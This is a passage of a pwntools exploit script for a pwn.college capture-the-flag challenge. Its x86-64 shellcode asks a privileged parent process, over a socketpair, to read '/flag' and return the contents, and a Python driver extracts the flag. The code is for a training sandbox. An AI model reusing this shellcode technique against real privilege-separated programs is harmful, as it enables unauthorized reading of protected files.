gdbscript = ''' 
# The script sends shellcode to the child process to read the flag file and return its content to the parent, which then displays it.
continue
'''.format(**locals())

# Shellcode to read the flag file and send its content to the parent
assembly = """
xor rax, rax
push 4  ; Push the file descriptor of the child socketpair onto the stack
pop rdi  ; Pop from the stack into rdi
lea rsi, [rip + flag]  ; Load the address of the file name (/flag)
push 60  ; Number of bytes to write 
pop rdx  ; Pop from the stack into rdx
push 1  ; Push the syscall number for write
pop rax  ; Pop from the stack into rax
syscall  ; Write 'read_file:/flag' into the child socketpair

push 4  ; Prepare to read the response from the parent
pop rdi  ; Pop into rdi (4 = file descriptor of the child socketpair)
lea rsi, [rip + flag_content]  ; Load the address where the flag content will be stored
push 60  ; Number of bytes to read
pop rdx  ; Pop from the stack into rdx
xor rax, rax  ; Prepare the syscall for reading
syscall  ; Read the content of the flag

push 4  ; Prepare to write the flag content to the parent
pop rdi  ; Pop into rdi (4 = file descriptor of the child socketpair)
lea rsi, [rip + print_msg]  ; Load the address of the message 'print_msg:'
push 128  ; Reading size 
pop rdx  ; Pop from the stack into rdx
push 1  ; Syscall number for write
pop rax  ; Pop from the stack into rax
syscall  ; Write the message and the flag to the parent

print_msg:
.ascii "print_msg:"  ; Message to send to the parent
flag_content:
.rept 60  ; Repeat the following command 60 times
.byte 0  ; Byte for filling
.endr

flag:
.asciz "read_file:/flag"  ; Command to request the flag file
"""

def exploit():
    with pwn.process([BINARY]) as p:  # Launch the process with the specified binary
        p.send(pwn.asm(assembly))  # Send the shellcode to the child process
        response = b""
        while True:
            try:
                chunk = p.recv(128)  # Receive the response from the parent in chunks of 128 bytes
                if not chunk:
                    break
                response += chunk  # Add the received chunks to the complete response
            except EOFError:
                break
        flag_match = re.search(rb'pwn\.college\{.*?\}', response)  # Search for the flag in the response
        if flag_match:
            flag = flag_match.group(0).decode()  # Display the flag if found
            print(f'Flag: {flag}')
        else:
            print("Flag not found in response.")  # Error message if the flag is not found
            
if __name__ == "__main__":
    exploit()  # Execute the exploit function
